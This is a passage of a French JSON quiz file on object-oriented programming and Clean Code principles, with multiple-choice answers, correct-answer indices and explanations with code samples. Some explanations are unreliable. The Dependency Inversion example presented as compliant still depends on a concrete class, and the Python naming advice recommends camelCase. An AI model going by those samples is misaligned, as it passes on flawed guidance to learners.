            "explanation": "Le mot-clé this (en JavaScript et Java) ou self (en Python) ou $this (en PHP) fait référence à l'instance actuelle de la classe dans laquelle il est utilisé.\nIl permet d'accéder aux attributs et méthodes de l'objet à l'intérieur de la classe.\n\nVoici des exemples dans différents langages :\nExemple en <b>JavaScript</b> :\nclass Personne {\n  constructor(nom) {\n    this.nom = nom;\n  }\n\n  sePresenter() {\n    console.log(`Hello ${this.nom}.`);\n  }\n}\n\nExemple en <b>Java</b> :\npublic class Personne {\n  private String nom;\n\n  public Personne(String nom) {\n    this.nom = nom;\n  }\n\n  public void sePresenter() {\n    System.out.println(\"Hello \" + this.nom + \".\");\n  }\n}\n\nExemple en <b>PHP</b> :\nclass Personne {\n  private $nom;\n\n  public function __construct($nom) {\n    $this->nom = $nom;\n  }\n\n  public function sePresenter() {\n    echo \"Hello {$this->nom}.\";\n  }\n} \n\nExemple en <b>Python</b>:\nclass Personne:\n  def __init__(self, nom):\n    self.nom = nom\n\n  def se_presenter(self):\n    print(f\"Hello {self.nom}.\")"
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que la surcharge de méthode ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le fait de remplacer une méthode héritée d'une classe par une nouvelle version avec le même nom et les mêmes paramètres",
                "Une technique qui permet d'utiliser le même nom de variable dans plusieurs classes différentes",
                "Une méthode qui appelle automatiquement d'autres méthodes du même nom dans les classes parentes",
                "La surcharge de méthode est un concept en POO qui permet de définir plusieurs méthodes avec le même nom dans une classe, mais avec des paramètres différents"
            ],
            "correct": 3,
            "explanation": "La surcharge de méthode est un concept en POO qui permet de définir plusieurs méthodes avec le même nom dans une classe, mais avec des paramètres différents.\nCela permet de créer plusieurs versions d'une méthode pour traiter différents types ou nombres de paramètres.\n\nExemple en <b>Java</b> :\npublic class Calculatrice {\n  public int additionner(int a, int b) {\n    return a + b;\n  }\n\n  public double additionner(double a, double b) {\n    return a + b;\n  }\n\n  public int additionner(int a, int b, int c) {\n    return a + b + c;\n  }\n}\n\nCalculatrice calc = new Calculatrice();\n\nSystem.out.println(calc.additionner(5, 3));\nSystem.out.println(calc.additionner(2.5, 3.7));\nSystem.out.println(calc.additionner(1, 2, 3));"
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que la surcharge d'opérateur ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Un processus qui permet d’ajouter de nouveaux opérateurs à un langage de programmation",
                "Une méthode qui change automatiquement le type d’un opérateur selon le contexte d’exécution",
                "Une technique utilisée pour fusionner plusieurs classes partageant les mêmes opérateurs",
                "La surcharge d'opérateur est une fonctionnalité en POO qui permet de redéfinir le comportement des opérateurs standard pour des objets de classes personnalisées"
            ],
            "correct": 3,
            "explanation": "La surcharge d'opérateur est une fonctionnalité en POO qui permet de redéfinir le comportement des opérateurs standard pour des objets de classes personnalisées.\nCela permet d'utiliser des opérateurs de manière intuitive avec des objets, comme on le ferait avec des types primitifs.\nPython supporte la surcharge contrairement à Java, JavaScript et PHP.\n\n<b>Exemple en Python</b>:\nclass Vecteur:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n\n    def __add__(self, autre):\n        return Vecteur(self.x + autre.x, self.y + autre.y)\n\n    def __str__(self):\n        return f'({self.x}, {self.y})'\n\nv1 = Vecteur(1, 2)\nv2 = Vecteur(3, 4)\nv3 = v1 + v2\nprint(v3)"
        },
        {
            "theme": "La POO",
            "question": "Comment la POO améliore-t-elle la réutilisabilité du code ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "En limitant le code à une seule classe par application pour simplifier sa lecture",
                "En évitant complètement la duplication de variables globales dans un projet",
                "En imposant la programmation procédurale dans tous les projets orientés objet",
                "La POO améliore la réutilisabilité du code de plusieurs façons"
            ],
            "correct": 3,
            "explanation": "La POO améliore la réutilisabilité du code de plusieurs façons.\n\t- Elle permet de regrouper les données et les méthodes au sein d'une même unité (la classe), facilitant la réutilisation des classes dans différents contextes\n\t- c'est l' encapsulation . - Elle permet de créer de nouvelles classes basées sur des classes existantes, réutilisant ainsi le code sans duplication \n\t- c'est l' héritage . - Elle permet l'utilisation d'une interface commune pour différents types d'objets, facilitant la réutilisation du code avec des objets de types variés\n\t- c'est le polymorphisme . - Elle encourage la création de modules ou de packages réutilisables dans différents projets \n\t- c'est la modularité . - Elle permet de créer des modèles réutilisables en se concentrant sur les caractéristiques essentielles d'un objet \n\t- c'est l' abstraction . - Elle encourage l'utilisation de modèles de conception réutilisables pour résoudre des problèmes courants \n\t- ce sont les design patterns ."
        },
        {
            "theme": "La POO",
            "question": "Comment la POO facilite-t-elle la maintenance du code ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "En imposant que toutes les classes soient déclarées dans un seul fichier pour plus de cohérence",
                "En réduisant la taille du code en supprimant automatiquement les méthodes inutilisées",
                "En interdisant la création d'objets dynamiques pendant l'exécution",
                "La POO facilite la maintenance du code de plusieurs manières essentielles"
            ],
            "correct": 3,
            "explanation": "La POO facilite la maintenance du code de plusieurs manières essentielles. \n\t- Le code est structuré au travers de module indépendants, améliorant la possibilité de modifier le code sans affecter le reste : on parle de la modularité du code. \n\t- Le code peut être réutilisé afin de réduire le code dupliquer et le temps nécessaide pour développer de nouvelles fonctionnalités, c'est l' héritage . \n\t- En regroupant les données et les méthodes dans des objets, elle les protège et assure une manipulation cohérente, réduisant le risque d'erreurs et améliorant la gestion des modifications, c'est l' encapsulation . \n\t- Les développeurs peuvent rapidement saisir la structure et le fonctionnement d'un programme, même s'ils n'en sont pas les auteur, on parle de clarté et de * compréhension *. \n\t- Enfin, de nouvelles fonctionnalités peuvent être ajoutées en créant de nouvelles classes ou en modifiant les classes existantes sans perturber le reste du code, on parle de flexibilité du code."
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que la composition ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Une méthode permettant d’hériter des classes sans utiliser le mot-clé 'extends'",
                "Une approche qui consiste à exécuter plusieurs objets en parallèle dans un même thread",
                "La composition est une relation entre classes où une classe (le composite) est responsable de la création et de la destruction de ses parties (les composants)",
                "Une manière de convertir automatiquement les classes en fonctions pour améliorer la performance"
            ],
            "correct": 2,
            "explanation": "La composition est une relation entre classes où une classe (le composite ) est responsable de la création et de la destruction de ses parties (les composants ).\nSi le composite est détruit, tous ses composants le sont également.\nCela implique une relation forte où les composants ne peuvent exister indépendamment du composite."
        },
        {
            "theme": "La POO",
            "question": "Quelle est la différence entre l'agrégation et la composition ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Dans l'agrégation, les objets partagent la même mémoire, tandis que dans la composition ils en ont une copie indépendante",
                "L'agrégation est utilisée uniquement pour les classes abstraites alors que la composition ne l'est pas",
                "La différence entre l'agrégation et la composition réside dans la force de la relation",
                "L'agrégation empêche l'utilisation du mot-clé 'new' contrairement à la composition"
            ],
            "correct": 2,
            "explanation": "La différence entre l'agrégation et la composition réside dans la force de la relation.\nL'agrégation est une relation 'partie-tout' plus faible, où les parties peuvent exister indépendamment du tout.\n\nPar exemple, une classe 'Équipe' peut avoir des 'Joueurs', mais les 'Joueurs' peuvent exister sans l' 'Équipe'. \n\nEn revanche, dans une composition, les parties ne peuvent pas exister sans le tout, comme une 'Maison' et ses 'Chambres'."
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que l'héritage multiple et quelles sont ses implications ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "L'héritage multiple est un mécanisme de POO qui permet à une classe de dériver de plusieurs classes parentes",
                "Un mécanisme qui interdit à une classe d'avoir plusieurs méthodes du même nom",
                "Un concept qui empêche la surcharge de méthodes dans les classes enfants",
                "Une technique de duplication d'attributs entre classes indépendantes"
            ],
            "correct": 0,
            "explanation": "L' héritage multiple est un mécanisme de POO qui permet à une classe de dériver de plusieurs classes parentes.\nCela signifie qu'une classe enfant peut hériter des attributs et des méthodes de plusieurs classes, combinant ainsi leurs fonctionnalités.\n\nDans les faits, il est supporté par peu de langages de programmation comme C++, Eiffel ou Python.\nBien que puissant, l'héritage multiple peut introduire des complexités, notamment le problème du diamant , où une classe hérite de deux classes qui ont un ancêtre commun.\nCela crée une ambiguïté sur la méthode à utiliser si les classes parentes ont des implémentations différentes d'une même méthode.\nPour gérer ces complexités, il est recommandé d'utiliser des interfaces ou des traits dans les langages qui les supportent, ce qui permet de combiner des comportements sans les complications de l'héritage multiple de classes."
        },
        {
            "theme": "La POO",
            "question": "Comment la POO gère-t-elle les exceptions et les erreurs ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "La POO gère les exceptions et les erreurs en utilisant une hiérarchie de classes d'exceptions",
                "En supprimant automatiquement les méthodes qui génèrent des erreurs pendant la compilation",
                "En créant un fichier de log pour chaque objet qui échoue à s'exécuter correctement",
                "En arrêtant le programme dès qu'une exception est rencontrée, sans possibilité de gestion"
            ],
            "correct": 0,
            "explanation": "La POO gère les exceptions et les erreurs en utilisant une hiérarchie de classes d'exceptions.\n\nLorsqu'une erreur se produit, une exception est lancée (thrown) et peut être attrapée (caught) et gérée par le code.\nLes exceptions sont lancées avec le mot-clé throw et attrapées dans des blocs try...catch.\nLes classes d'exceptions peuvent être personnalisées pour représenter différents types d'erreurs.\n\nLes exceptions permettent de propager les erreurs à travers la pile d'appels des méthodes jusqu'à ce qu'elles soient gérées.\nCela évite de mélanger la logique métier avec la gestion des erreurs et rend le code plus lisible et maintenable."
        },
        {
            "theme": "La POO",
            "question": "Comment les objets immuables sont-ils utilisés ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Ils sont utilisés pour créer des objets qui peuvent être modifiés dynamiquement après leur instanciation",
                "Ils servent principalement à stocker les variables globales partagées entre plusieurs classes",
                "Un objet immuable est un objet dont l'état ne peut pas être modifié après sa création",
                "Ils permettent de supprimer automatiquement les attributs inutilisés dans une classe"
            ],
            "correct": 2,
            "explanation": "Un objet immuable est un objet dont l'état ne peut pas être modifié après sa création.\nEn POO, les objets immuables sont souvent utilisés pour représenter des données qui ne doivent pas changer, comme les chaînes de caractères ou les nombres. Les objets immuables offrent plusieurs avantages :\n\t- Ils sont thread-safe car leur état ne peut pas être modifié par plusieurs threads en même temps.\n\t- Ils sont plus sûrs car il est impossible de les corrompre accidentellement.\n\t- Ils sont plus faciles à comprendre et à raisonner car leur état ne change pas.\n\t- Ils peuvent être utilisés comme clés dans des collections comme les dictionnaires ou les sets."
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que la sérialisation ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Un processus qui consiste à fusionner plusieurs classes en une seule pour optimiser le stockage",
                "La sérialisation est le processus qui consiste à convertir un objet en une séquence de bits qui peut être stockée ou transmise, et à le désérialiser pour recréer l'objet original",
                "Une technique de chiffrement utilisée pour protéger les objets sensibles en mémoire",
                "Une méthode utilisée pour créer des objets temporaires à partir d'une base de données"
            ],
            "correct": 1,
            "explanation": "La sérialisation est le processus qui consiste à convertir un objet en une séquence de bits qui peut être stockée ou transmise, et à le désérialiser pour recréer l'objet original.\nEn POO, la sérialisation permet de :\n\t- Stocker l'état d'un objet sur disque ou dans une base de données,\n\t- Transmettre des objets sur un réseau, \n\t- Cloner des objets en mémoire, \n\t- Implémenter la persistance des objets. \n\nLa sérialisation fonctionne en parcourant récursivement les champs de l'objet et en les convertissant en une représentation sérialisée.\nLa désérialisation fait l'inverse en recréant l'objet à partir de cette représentation."
        },
        {
            "theme": "La POO",
            "question": "Quelle est la différence entre l'héritage et la composition ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "L'héritage étend une classe mère ('est un') et crée un couplage fort ; la composition inclut un objet dans un autre par un attribut ('a un'), ce qui favorise le couplage faible et la flexibilité",
                "L'héritage copie le code d'une classe dans un fichier séparé, la composition le compresse",
                "La composition oblige deux classes à partager la même classe mère",
                "Il n'y a pas de différence : ce sont deux syntaxes du même mécanisme"
            ],
            "correct": 0,
            "explanation": "Héritage : Voiture 'est un' Vehicule - réutilisation forte, mais couplage fort à la classe mère et hiérarchie rigide (casser l'encapsulation si on touche à la mère impacte toutes les filles).\nComposition : Voiture 'a un' Moteur - on délègue à un objet injecté, qu'on peut remplacer à l'exécution (moteur électrique, essence) et mocker dans les tests.\nRègle professionnelle : 'préférer la composition à l'héritage' - l'héritage se justifie quand la relation 'est un' est réelle et stable (Vehicule/Voiture), la composition quand il s'agit d'un 'a un' ou d'un 'utilise' (Voiture/Moteur, UserService/UserRepository).\nLien avec les piliers de la POO : la composition sert l'encapsulation et le polymorphisme via des interfaces."
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que le design pattern Strategy ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "Un pattern qui garantit qu'une classe n'a qu'une seule instance",
                "Un pattern qui encapsule une famille d'algorithmes interchangeables derrière une interface commune, l'algorithme étant choisi et changé à l'exécution",
                "Un pattern qui observe automatiquement les changements d'un objet",
                "Un pattern qui masque l'accès à la base de données derrière une interface"
            ],
            "correct": 1,
            "explanation": "Strategy répond au problème : 'un même traitement avec plusieurs variantes d'algorithme'.\nMise en oeuvre : chaque algorithme devient une classe implémentant la même interface (RemiseBronze, RemiseArgent, RemiseOr ; ou PaiementCB, PaiementPayPal), et la classe cliente délègue à la stratégie courante.\nBénéfices :\n- supprime les if/switch à répétition ;\n- ajouter un nouvel algorithme sans toucher au code existant (Open/Closed Principle) ;\n- chaque stratégie testable isolément.\nExemples connus : stratégies de tri des collections en Java, modes de paiement, algorithmes de calcul de frais de port.\nC'est un des patterns les plus cités en entretien CDA avec Singleton, Factory, Observer et Repository."
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que le design pattern Observer ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "Un pattern qui définit une relation un-à-plusieurs : quand le sujet change d'état, il notifie automatiquement tous ses observateurs inscrits",
                "Un pattern qui remplace la base de données par des fichiers texte",
                "Un pattern qui force chaque classe à hériter d'une classe mère unique",
                "Un pattern qui chiffre les échanges entre objets"
            ],
            "correct": 0,
            "explanation": "Observer découple un sujet de ses dépendants :\n- le sujet maintient une liste d'observateurs et les notifie quand son état change ;\n- chaque observateur réagit de son côté.\nExemples réels : addEventListener du DOM (le bouton notifie ses écouteurs), newsletter, notification push, rafraîchissement d'un tableau de bord.\nCas d'usage projet : 'quand une commande est validée, prévenir le service mail ET le service statistiques' - le service commandes ne connaît pas les observateurs concrets, on en ajoute sans le modifier.\nBénéfice : découplage maximal entre l'émetteur et les récepteurs ; c'est la base des systèmes d'événements et de l'architecture événementielle."
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que le design pattern Repository ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "Un pattern qui centralise l'accès aux données derrière une interface, de sorte que la logique métier manipule des objets sans connaître le SQL ni la source de persistance",
                "Un pattern qui duplique la base de données pour accélérer les requêtes",
                "Un pattern qui génère la documentation du projet",
                "Un pattern qui remplace les contrôleurs par des vues"
            ],
            "correct": 0,
            "explanation": "Repository = couche entre le métier et la persistance :\n- interface du type UserRepository avec findByEmail(), save(), delete() ;\n- la logique métier appelle ces méthodes sans écrire de SQL ;\n- l'implémentation (SQL, ORM, API externe) est interchangeable.\nBénéfices :\n- testabilité : on mocke le repository pour tester le métier sans base de données ;\n- centralisation : les requêtes ne sont pas dispersées dans l'application ;\n- respect de la séparation des responsabilités.\nTrès utilisé en entreprise : Spring Data, Doctrine repositories, Eloquent.\nC'est souvent le premier pattern qu'un candidat CDA peut citer avec un exemple concret de son projet."
        }
    ],
    "Le Clean Code": [
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que le Clean Code ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un code qui s'exécute rapidement, peu importe sa lisibilité",
                "Un ensemble de règles imposées par les langages de programmation modernes",
                "Le Clean Code désigne un ensemble de pratiques et de principes qui visent à produire un code compréhensible, efficace et intuitif à manipuler",
                "Un code qui utilise uniquement des commentaires pour être clair"
            ],
            "correct": 2,
            "explanation": "Le Clean Code désigne un ensemble de pratiques et de principes qui visent à produire un code compréhensible, efficace et intuitif à manipuler.\n\nPopularisé par <b>Robert C. Martin</b> dans son livre <i>Clean Code: A Handbook of Agile Software Craftsmanship</i> , ce concept souligne l'importance de la lisibilité et de la maintenabilité du code.\n\nLe Clean Code se concentre sur plusieurs aspects essentiels :\n\t- La simplicité du code , évitant la complexité inutile.\n\t- La cohérence et l'intentionnalité , où le code doit être lisible et compréhensible par d'autres développeurs.\n\t- La responsabilité du développeur envers son code, y compris la gestion éthique des données.\n\nEn adoptant ces principes, le Clean Code permet de faciliter la collaboration entre développeurs, d'améliorer la durabilité du code et de réduire les coûts de maintenance à long terme."
        },
        {
            "theme": "Le Clean Code",
            "question": "Comment nommer des variables et des fonctions en Python ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Pour garantir un code propre en Python, il est essentiel de donner des noms explicites aux variables et aux fonctions",
                "En utilisant des noms très courts pour écrire plus vite",
                "En mélangeant majuscules et minuscules pour distinguer les fonctions",
                "En utilisant des chiffres et symboles pour rendre les noms uniques"
            ],
            "correct": 0,
            "explanation": "Pour garantir un code propre en Python, il est essentiel de donner des noms explicites aux variables et aux fonctions. \n\nVoici quelques conseils:\n\t- Utilisez des noms significatifs qui décrivent clairement ce que fait la variable ou la fonction;\n\t- Suivez les conventions du nommage du langage en question;\n\t- Évitez les abréviations et les noms trop courts qui peuvent prêter à confusion;\n\t- Préférez des noms qui expriment le type et l'utilisation au premier coup d'œil, par exemple, totalObservations plutôt que tot_obs ;\n\t- Utilisez des verbes pour nommer les fonctions, par exemple, getArticles() plutôt que articles().\n\nExemple de bon nommage en <b>Python</b>:\ndef calculate_total_price(items):\n    total_price = 0\n    for item in items:\n        total_price += item['price']\n    return total_price \n\nExemple de mauvais nommage en <b>Python</b>:\ndef proc(l):\n    t = 0\n    for i in l:\n        t += i['p']\n    return t"
        },
        {
            "theme": "Le Clean Code",
            "question": "Comment garder des fonctions propres ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En regroupant plusieurs fonctionnalités dans une seule fonction pour gagner du temps",
                "En écrivant des fonctions très longues afin d’éviter la duplication",
                "Les fonctions doivent être courtes, idéalement ne dépassant pas 20 lignes, chaque fonction doit effectuer une seule tâche et ne pas avoir d'effets de bord.",
                "En ajoutant un maximum de commentaires pour compenser un code complexe"
            ],
            "correct": 2,
            "explanation": "Pour maintenir des fonctions lisibles et efficaces, suivez ces principes : \n\t- Les fonctions doivent être courtes, idéalement ne dépassant pas 20 lignes,\n\t- Chaque fonction doit effectuer une seule tâche et ne pas avoir d'effets de bord, c'est-à-dire qu'elle ne doit pas modifier des variables externes,\n\t- Évitez les niveaux d'abstraction mélangés dans une même fonction; chaque fonction doit être cohérente dans son niveau d'abstraction,\n\t- Utilisez des paramètres clairs et évitez d'avoir trop d'arguments pour une fonction.\n\nExemple de fonction en python avec du code illisible : def aff(n):\n    for i in range(2, n + 1):\n        p = True\n        for j in range(2, int(i ** 0.5) + 1):\n            if i % j == 0:\n                p = False\n                break\n        if p:\n            print(i, end=' ')\n\nExemple de fonctions propres pour afficher les nombres premiers :\ndef est_nombre_premier(nombre):\n    if nombre < 2:\n        return False\n    for diviseur in range(2, int(nombre ** 0.5) + 1):\n        if nombre % diviseur == 0:\n            return False\n    return True\n\ndef generer_nombres_premiers(limite):\n    return [nombre for nombre in range(2, limite + 1) if est_nombre_premier(nombre)]\n\ndef afficher_nombres_premiers(limite):\n    nombres_premiers = generer_nombres_premiers(limite)\n    print(' '.join(map(str, nombres_premiers)))"
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que le concept SOLID ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Un modèle de gestion de bases de données relationnelles",
                "Un format de code orienté performance pour les langages compilés",
                "Le concept SOLID est un acronyme qui regroupe cinq principes de conception destinés à produire des architectures logicielles plus compréhensibles, flexibles et maintenables",
                "Une méthode de compression de code utilisée en Java"
            ],
            "correct": 2,
            "explanation": "Le concept SOLID est un acronyme qui regroupe cinq principes de conception destinés à produire des architectures logicielles plus compréhensibles, flexibles et maintenables.\n\n\t- Le Single Responsibility Principle (SRP) (ou principe de responsabilité unique) stipule qu'une classe doit avoir une seule raison de changer.\n\t- Le Open/Closed Principle (OCP) (ou ouvert/fermé) affirment que les entités doivent être ouvertes à l'extension mais fermées à la modification.\n\t- Le Liskov Substitution Principle (LSP) (ou principe de substitution de Liskov) mentionne que les objets d'une classe dérivée doivent pouvoir remplacer ceux de la classe de base sans altérer le fonctionnement du programme.\n\t- Le Interface Segregation Principle (ISP) (ou principe de ségrégation des interfaces) considère qu'il est préférable d'avoir plusieurs interfaces spécifiques plutôt qu'une seule interface générale.\n\t- Le Dependency Inversion Principle (ou le principe d'inversion des dépendances) indique que les modules de haut niveau ne doivent pas dépendre des modules de bas niveau, mais des abstractions."
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que le Single Responsibility Principle (SRP) ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un principe qui recommande de diviser une fonction en plusieurs sous-fonctions identiques",
                "Un concept qui favorise la duplication du code pour plus de clarté",
                "Le Single Responsibility Principle (SRP) (ou principe de responsabilité unique) indique qu'une classe doit avoir une seule raison de changer...",
                "Une règle qui impose d’avoir une seule fonction principale par fichier"
            ],
            "correct": 2,
            "explanation": "Le Single Responsibility Principle (SRP) (ou principe de responsabilité unique) indique qu'une classe doit avoir une seule raison de changer, c'est-à-dire qu'elle doit être responsable d'une seule fonctionnalité ou d'un seul aspect du comportement.\nCela permet de réduire les dépendances et de rendre le code plus facile à maintenir et à tester.\n\nExemple en <b>Python</b> avec violation du SRP :\nclass Employe:\n    def __init__(self, nom, salaire):\n        self.nom = nom\n        self.salaire = salaire\n\n    def calculer_paie(self):\n        # Calcul simplifié\n        return self.salaire * 0.9\n\n    def sauvegarder_employe(self):\n        print(f'Sauvegarde de {self.nom}.')\n\nExemple en <b>Python</b> respectant SRP :\nclass Employe:\n    def __init__(self, nom, salaire):\n        self.nom = nom\n        self.salaire = salaire\n\nclass CalculateurPaie:\n    def calculer_paie(self, employe):\n        # Calcul simplifié\n        return employe.salaire * 0.9\n\nclass GestionnaireBaseDeDonnees:\n    def sauvegarder_employe(self, employe):\n        print(f'Sauvegarde de {employe.nom}.')"
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que l'Open/Closed Principle (OCP) ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "L'Open/Closed Principle (OCP) (ou ouvert/fermé) stipule qu'une classe doit être ouverte à l'extension , mais fermée à la modification ",
                "Un principe qui interdit d’utiliser des classes héritées dans un projet",
                "Une méthode qui consiste à fermer le code source pour éviter les erreurs",
                "Une règle qui impose d’utiliser uniquement du code open source"
            ],
            "correct": 0,
            "explanation": "L' Open/Closed Principle (OCP) (ou ouvert/fermé) stipule qu'une classe doit être ouverte à l'extension , mais fermée à la modification.\nCela signifie que vous devez pouvoir ajouter de nouvelles fonctionnalités à une classe sans avoir à modifier son code existant.\nCe principe favorise la réutilisabilité du code et aide à éviter les effets de bord lors de la modification du code existant.\n\nPar exemple, au lieu de modifier une méthode dans une classe pour ajouter une nouvelle fonctionnalité, vous pouvez créer une nouvelle classe qui étend la classe existante.\nL'héritage est une des méthodes les plus courantes pour appliquer ce principe, mais il existe également d'autres approches, comme l'utilisation de design patterns tels que le décorateur.\nEn suivant ce principe, les développeurs peuvent créer des systèmes plus flexibles et maintenables, ce qui est essentiel dans le développement de logiciels évolutifs.\n\nExemple en <b>Python</b> utilisant l'héritage :\nclass Forme:\n    def aire(self):\n        pass\n\nclass Rectangle(Forme):\n    def __init__(self, largeur, hauteur):\n        self.largeur = largeur\n        self.hauteur = hauteur\n\n    def aire(self):\n        return self.largeur * self.hauteur\n\nclass Cercle(Forme):\n    def __init__(self, rayon):\n        self.rayon = rayon\n\n    def aire(self):\n        return 3.14 * self.rayon ** 2\n\ndef calculer_aire_totale(formes):\n    return sum(forme.aire() for forme in formes)\n\nformes = [Rectangle(3, 4), Cercle(2)]\nprint(calculer_aire_totale(formes))  # Calcule l'aire totale"
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que le Liskov Substitution Principle (LSP) ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un principe de test unitaire qui remplace les classes de base par des mocks",
                "Le Liskov Substitution Principle (LSP) (ou le principe de substitution de Liskov) stipule que les objets d'une classe dérivée doivent pouvoir remplacer les objets de la classe de base sans altérer le fonctionnement du programme",
                "Une règle qui impose de remplacer toutes les classes par des interfaces",
                "Une méthode d’optimisation de mémoire pour les classes dérivées"
            ],
            "correct": 1,
            "explanation": "Le Liskov Substitution Principle (LSP) (ou le principe de substitution de Liskov) stipule que les objets d'une classe dérivée doivent pouvoir remplacer les objets de la classe de base sans altérer le fonctionnement du programme.\nCela garantit que les classes dérivées sont substituables à leurs classes de base, ce qui favorise la polymorphie et la réutilisation du code.\n\nVoici un exemple de code en <b>Python</b> respectant le principe de Liskov :\nclass Forme:\n    def aire(self):\n        pass\n\nclass Rectangle(Forme):\n    def __init__(self, largeur, hauteur):\n        self.largeur = largeur\n        self.hauteur = hauteur\n\n    def aire(self):\n        return self.largeur * self.hauteur\n\nclass Carre(Forme):\n    def __init__(self, cote):\n        self.cote = cote\n\n    def aire(self):\n        return self.cote * self.cote\n\ndef afficher_aire(forme):\n    print(f'Aire: {forme.aire()}')\n\nrectangle = Rectangle(5, 4)\ncarre = Carre(5)\n\nafficher_aire(rectangle)  # Aire: 20\nafficher_aire(carre)      # Aire: 25"
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que l'Interface Segregation Principle (ISP) ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un principe qui recommande d’avoir une seule interface globale pour tout le projet",
                "Une règle de sécurité pour séparer les interfaces utilisateurs et administrateurs",
                "Une méthode de chiffrement des interfaces réseaux",
                "L'Interface Segregation Principle (ISP) (ou principe de ségrégation des interfaces) stipule qu'il est préférable d'avoir plusieurs interfaces spécifiques plutôt qu'une seule interface générale"
            ],
            "correct": 3,
            "explanation": "L'Interface Segregation Principle (ISP) (ou principe de ségrégation des interfaces) stipule qu'il est préférable d'avoir plusieurs interfaces spécifiques plutôt qu'une seule interface générale.\nCela signifie qu'une classe ne doit pas être forcée d'implémenter des méthodes qu'elle n'utilise pas. En respectant ce principe, on réduit le couplage et on améliore la flexibilité et la maintenabilité du code. \n\nExemple en Java respectant le principe de ségrégation des interfaces :\ninterface Printer {\n    void print(String document);\n}\n\ninterface Scanner {\n    void scan(String document);\n}\n\ninterface Fax {\n    void fax(String document);\n}\n\nclass MultiFunctionDevice implements Printer, Scanner, Fax {\n    public void print(String document) {\n        System.out.println(\"Printing: \" + document);\n    }\n\n    public void scan(String document) {\n        System.out.println(\"Scanning: \" + document);\n    }\n\n    public void fax(String document) {\n        System.out.println(\"Faxing: \" + document);\n    }\n}\n\nclass SimplePrinter implements Printer {\n    public void print(String document) {\n        System.out.println(\"Printing: \" + document);\n    }\n}"
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que le Dependency Inversion Principle ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Une méthode de gestion des dépendances via les fichiers externes uniquement",
                "Un principe qui impose que les classes haut niveau héritent toujours des classes bas niveau",
                "Une approche qui supprime totalement les dépendances entre modules",
                "Le Dependency Inversion Principle (DIP) (ou le principe d'inversion des dépendances) encourage l'injection des dépendances abstraites plutôt que de dépendre de classes concrètes"
            ],
            "correct": 3,
            "explanation": "Le Dependency Inversion Principle (DIP) (ou le principe d'inversion des dépendances) encourage l' injection des dépendances abstraites plutôt que de dépendre de classes concrètes.\n\nEn d'autres termes, les modules de haut niveau ne devraient pas dépendre directement des modules de bas niveau, mais plutôt d'abstractions communes.\nCela favorise la modularité, facilite les tests unitaires et réduit le couplage entre les modules, rendant le code plus flexible et réutilisable.\n\nExemple en <b>Java</b> violant le principe d'inversion des dépendances :\nclass MySQLDatabase {\n    public void save(String data) {\n        System.out.println(\"Saving \" + data + \" to MySQL database\");\n    }\n}\n\nclass UserService {\n    private MySQLDatabase db;\n\n    public UserService() {\n        this.db = new MySQLDatabase();\n    }\n\n    public void createUser(String userData) {\n        db.save(userData);\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        UserService userService = new UserService();\n        userService.createUser(\"John Doe\");\n    }\n} Exemple en Java respectant le principe d'inversion des dépendances : class MySQLDatabase {\n    public void save(String data) {\n        System.out.println(\"Saving \" + data + \" to MySQL database\");\n    }\n}\n\nclass UserService {\n    private MySQLDatabase db;\n\n    public UserService(MySQLDatabase database) {\n        this.db = database;\n    }\n\n    public void createUser(String userData) {\n        db.save(userData);\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        MySQLDatabase mysqlDb = new MySQLDatabase();\n        UserService userService = new UserService(mysqlDb);\n        userService.createUser(\"John Doe\");\n    }\n}"
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que l'Inversion of Control ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un concept qui consiste à inverser la hiérarchie des classes dans un programme orienté objet",
                "Une technique d’optimisation de mémoire en programmation fonctionnelle",
                "L' Inversion of Control (IoC) (ou inversion de contrôle) est un principe de conception qui inverse le flux de contrôle d'un programme",
                "Un design pattern pour remplacer les classes héritées par des fonctions"
            ],
            "correct": 2,
